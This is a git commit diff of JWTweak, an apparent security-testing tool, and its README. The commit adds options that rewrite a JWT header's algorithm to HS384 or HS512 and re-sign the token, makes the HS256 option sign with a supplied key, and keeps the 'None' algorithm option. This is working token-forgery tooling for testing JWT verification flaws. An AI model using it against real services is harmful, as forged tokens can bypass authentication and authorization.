a66599c875df7c9b8e73b3ec24fccbc6d10f36b1
root <root@mail.gugel.com>
2020-04-28 10:08:09 +0530

    All features are live now

--- JWTweak.py
+++ JWTweak.py
@@ -1,5 +1,5 @@
-#JWTweak-v0.2
-
+#JWTweak-v1.0
+import os
 import jwt
 import re
 import base64
@@ -105,7 +105,7 @@ def jwtWeak():
                     Signature = Signature + "="
                 req_str = base64.b64decode(Signature)
             else:
-                req_str = base64.b64decode(Signature)         
+                req_str = base64.b64decode(Signature)                        
             #base64 decoded Signature 
             print("\n\tSignature="+str(req_str))
             
@@ -141,9 +141,9 @@ def jwtWeak():
             
             json_header['alg']='None'
             
-            json_header=json.dumps(json_header)
+            str_json_header=json.dumps(json_header)
             
-            print("\n\tModified Header(Plain Text)="+str(json_header))
+            print("\n\tModified Header(Plain Text)="+str(str_json_header))
             if len(Payload) % 4 != 0: #check if multiple of 4
                 while len(Payload) % 4 != 0:
                     Payload = Payload + "="
@@ -195,6 +195,7 @@ def jwtWeak():
             else:
                 req_str = base64.b64decode(Header)
                 req_str=req_str.decode('utf-8')
+            b64_decoded_header=req_str    
             json_header = json.loads(req_str)
             algo=json_header['alg']
             print(f"{bcolors.HEADER}\n\tThe present algorithm - "+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
@@ -209,8 +210,8 @@ def jwtWeak():
             print(f"{bcolors.WARNING}\n\tAfter Algorithm Changed to 'HS256':{bcolors.ENDC}")
             
             json_header['alg']='HS256'
-            
-            print("\n\tModified Header(Plain Text)="+str(json_header))
+            str_json_header=json.dumps(json_header)
+            print("\n\tModified Header(Plain Text)="+str(str_json_header))
             if len(Payload) % 4 != 0: #check if multiple of 4
                 while len(Payload) % 4 != 0:
                     Payload = Payload + "="
@@ -218,9 +219,9 @@ def jwtWeak():
             else:
                 req_str = base64.b64decode(Payload)
             b64decoded_payload=req_str.decode('utf-8')
-            json_payload=json.loads(b64decoded_payload)
+            #json_payload=json.loads(b64decoded_payload)
             #base64 decoded Payload    
-            print("\n\tPayload(Plain Text)="+str(json_payload)) 
+            print("\n\tPayload(Plain Text)="+str(b64decoded_payload)) 
             
             
             print("\n\tPlease provide the modified Payload(plain text) [if not, press ENTER]:")
@@ -235,8 +236,15 @@ def jwtWeak():
                 b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                 b64_encoded_Payload = str(b64_Payload, "utf-8")
                 json_mod_payload=json.loads(mod_payload)
-                encoded_HS256 = jwt.encode(json_mod_payload, 'adadwfff', algorithm='HS256')  
-                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS256':\n\t"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+                
+                print("\n\tEnter the symmetic key/secret for generating the signature:")                
+                hs256_key=input()
+                
+                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS256')
+                str_encoded_HS256=encoded_HS256.decode('utf')  
+                
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS256':\n\t"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+           
             elif not mod_payload:
                 print(f"{bcolors.OKBLUE}\n\tThe payload is unchanged{bcolors.ENDC}")
                 json_header=str(json_header)
@@ -245,7 +253,14 @@ def jwtWeak():
                 b64decoded_payload=str(b64decoded_payload)
                 b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                 b64_encoded_Payload = str(b64_Payload, "utf-8")
-                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS256':\n\t"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+                json_mod_payload=json.loads(b64decoded_payload)
+                
+                print("\n\tEnter the symmetic key/secret for generating the signature:")                
+                hs256_key=input()
+                
+                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS256')
+                str_encoded_HS256=encoded_HS256.decode('utf')
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS256':\n\t"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
             else:
                 print("Not Valid Payload") 
             
@@ -253,19 +268,178 @@ def jwtWeak():
 #Generate JWT Token with Algorithm type 'HS384'
 #######################################################################################
         elif choice == "E" or choice =="e":
-            print("Feature coming soon")        
+            part_jwt=in_jwt.split('.')
+            Header=part_jwt[0]
+            Payload=part_jwt[1]
+            Signature=part_jwt[2]
+            print(f"{bcolors.WARNING}\n\tBefore Algorithm Coversion:{bcolors.ENDC}")
+            if len(Header) % 4 != 0: #check if multiple of 4
+                while len(Header) % 4 != 0:
+                    Header = Header + "="
+                req_str = base64.b64decode(Header)
+            else:
+                req_str = base64.b64decode(Header)
+                req_str=req_str.decode('utf-8')
+            b64_decoded_header=req_str    
+            json_header = json.loads(req_str)
+            algo=json_header['alg']
+            print(f"{bcolors.HEADER}\n\tThe present algorithm - "+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
+
+            #base64 encoded Header
+            print("\n\tHeader="+Header)
+            #base64 encoded Payload  
+            print("\n\tPayload="+Payload)
+            #base64 encoded Signature
+            print("\n\tSignature="+Signature) 
+            
+            print(f"{bcolors.WARNING}\n\tAfter Algorithm Changed to 'HS384':{bcolors.ENDC}")
+            
+            json_header['alg']='HS384'
+            str_json_header=json.dumps(json_header)
+            print("\n\tModified Header(Plain Text)="+str(str_json_header))
+            if len(Payload) % 4 != 0: #check if multiple of 4
+                while len(Payload) % 4 != 0:
+                    Payload = Payload + "="
+                req_str = base64.b64decode(Payload)
+            else:
+                req_str = base64.b64decode(Payload)
+            b64decoded_payload=req_str.decode('utf-8')
+            #json_payload=json.loads(b64decoded_payload)
+            #base64 decoded Payload    
+            print("\n\tPayload(Plain Text)="+str(b64decoded_payload)) 
+            
+            
+            print("\n\tPlease provide the modified Payload(plain text) [if not, press ENTER]:")
+            mod_payload=input()
+            if re.match(r'(.*?)(?:")',mod_payload):
+                print("\n\tModified payload is:"+mod_payload)
+               # json_mod_payload=
+                json_header=str(json_header)
+                b64_Header = base64.b64encode(json_header.encode("utf-8"))
+                b64_encoded_header = str(b64_Header, "utf-8")
+                mod_payload=str(mod_payload)
+                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
+                b64_encoded_Payload = str(b64_Payload, "utf-8")
+                json_mod_payload=json.loads(mod_payload)
+                
+                print("\n\tEnter the symmetic key/secret for generating the signature:")                
+                hs256_key=input()
+                
+                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS384')
+                str_encoded_HS256=encoded_HS256.decode('utf')  
+                
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS384':\n\t"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+           
+            elif not mod_payload:
+                print(f"{bcolors.OKBLUE}\n\tThe payload is unchanged{bcolors.ENDC}")
+                json_header=str(json_header)
+                b64_Header = base64.b64encode(json_header.encode("utf-8"))
+                b64_encoded_header = str(b64_Header, "utf-8")
+                b64decoded_payload=str(b64decoded_payload)
+                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
+                b64_encoded_Payload = str(b64_Payload, "utf-8")
+                json_mod_payload=json.loads(b64decoded_payload)
+                
+                print("\n\tEnter the symmetic key/secret for generating the signature:")                
+                hs256_key=input()
+                
+                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS384')
+                str_encoded_HS256=encoded_HS256.decode('utf')
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS384':\n\t"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+            else:
+                print("Not Valid Payload")         
         
 #######################################################################################
 #Generate JWT Token with Algorithm type 'HS512'
 #######################################################################################       
         elif choice == "F" or choice =="f":
-            print("Feature coming soon")
+            part_jwt=in_jwt.split('.')
+            Header=part_jwt[0]
+            Payload=part_jwt[1]
+            Signature=part_jwt[2]
+            print(f"{bcolors.WARNING}\n\tBefore Algorithm Coversion:{bcolors.ENDC}")
+            if len(Header) % 4 != 0: #check if multiple of 4
+                while len(Header) % 4 != 0:
+                    Header = Header + "="
+                req_str = base64.b64decode(Header)
+            else:
+                req_str = base64.b64decode(Header)
+                req_str=req_str.decode('utf-8')
+            b64_decoded_header=req_str    
+            json_header = json.loads(req_str)
+            algo=json_header['alg']
+            print(f"{bcolors.HEADER}\n\tThe present algorithm - "+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
+
+            #base64 encoded Header
+            print("\n\tHeader="+Header)
+            #base64 encoded Payload  
+            print("\n\tPayload="+Payload)
+            #base64 encoded Signature
+            print("\n\tSignature="+Signature) 
+            
+            print(f"{bcolors.WARNING}\n\tAfter Algorithm Changed to 'HS512':{bcolors.ENDC}")
+            
+            json_header['alg']='HS512'
+            str_json_header=json.dumps(json_header)
+            print("\n\tModified Header(Plain Text)="+str(str_json_header))
+            if len(Payload) % 4 != 0: #check if multiple of 4
+                while len(Payload) % 4 != 0:
+                    Payload = Payload + "="
+                req_str = base64.b64decode(Payload)
+            else:
+                req_str = base64.b64decode(Payload)
+            b64decoded_payload=req_str.decode('utf-8')
+            #json_payload=json.loads(b64decoded_payload)
+            #base64 decoded Payload    
+            print("\n\tPayload(Plain Text)="+str(b64decoded_payload)) 
+            
+            
+            print("\n\tPlease provide the modified Payload(plain text) [if not, press ENTER]:")
+            mod_payload=input()
+            if re.match(r'(.*?)(?:")',mod_payload):
+                print("\n\tModified payload is:"+mod_payload)
+               # json_mod_payload=
+                json_header=str(json_header)
+                b64_Header = base64.b64encode(json_header.encode("utf-8"))
+                b64_encoded_header = str(b64_Header, "utf-8")
+                mod_payload=str(mod_payload)
+                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
+                b64_encoded_Payload = str(b64_Payload, "utf-8")
+                json_mod_payload=json.loads(mod_payload)
+                
+                print("\n\tEnter the symmetic key/secret for generating the signature:")                
+                hs256_key=input()
+                
+                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS512')
+                str_encoded_HS256=encoded_HS256.decode('utf')  
+                
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS512':\n\t"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+           
+            elif not mod_payload:
+                print(f"{bcolors.OKBLUE}\n\tThe payload is unchanged{bcolors.ENDC}")
+                json_header=str(json_header)
+                b64_Header = base64.b64encode(json_header.encode("utf-8"))
+                b64_encoded_header = str(b64_Header, "utf-8")
+                b64decoded_payload=str(b64decoded_payload)
+                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
+                b64_encoded_Payload = str(b64_Payload, "utf-8")
+                json_mod_payload=json.loads(b64decoded_payload)
+                
+                print("\n\tEnter the symmetic key/secret for generating the signature:")                
+                hs256_key=input()
+                
+                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS512')
+                str_encoded_HS256=encoded_HS256.decode('utf')
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'HS512':\n\t"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+            else:
+                print("Not Valid Payload")    
+            
         
         
         elif choice=="Q" or choice=="q":
-            sys.exit
+            exit()
         else:
-            print("You must only select either A,B,C,D,E or F.")
+            print("You must only select either A,B,C,D,E,F or Q.")
             print("Please try again")                
     
     else:
--- README.md
+++ README.md
@@ -4,26 +4,23 @@
 This tool is basically designed to automate the progress of changing the JWT algorithm of input JWT Token and then generate the new JWT based on changed algorithm.
 
 #### Features
-- Detect the algorithm of the input JWT Token [live]
-- Base64 decode the input JWT Token [live]
-- Generate new JWT Token by changing the algorithm of the input JWT to 'None' [live]
-- Generate new JWT Token by changing the algorithm of the input JWT to 'HS256' [build ongoing]
-- Generate new JWT Token by changing the algorithm of the input JWT to 'HS384' [coming soon]
-- Generate new JWT Token by changing the algorithm of the input JWT to 'HS512' [coming soon]
+- Detect the algorithm of the input JWT Token 
+- Base64 decode the input JWT Token 
+- Generate new JWT Token by changing the algorithm of the input JWT to 'None' 
+- Generate new JWT Token by changing the algorithm of the input JWT to 'HS256' 
+- Generate new JWT Token by changing the algorithm of the input JWT to 'HS384' 
+- Generate new JWT Token by changing the algorithm of the input JWT to 'HS512' 
                     
 
 ### Changelogs
-#### Version-0.1 (27-Apr-2020)
+#### Version-1.0 (28-Apr-2020)
 #### Feature
-Now 2 features Supports
-- Base64 decode the input JWT Token
-- Generate new JWT Token by changing algorthim to `None`
-
-#### Version-0.2 (28-Apr-2020)
-#### Feature
-Now 1 feature added
 - Option to Detect the algorithm of the input JWT
+- Base64 decode the input JWT Token
+- Generate new JWT Token by changing algorthim to `None` and `HS256/384/512`
 
-### Read more
+
+
+### Read more where it can help
 - [JWT Attack Walk-Through-NCC Group](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/)
 - [Hack the JWT Token-Habr](https://habr.com/en/post/450054/)
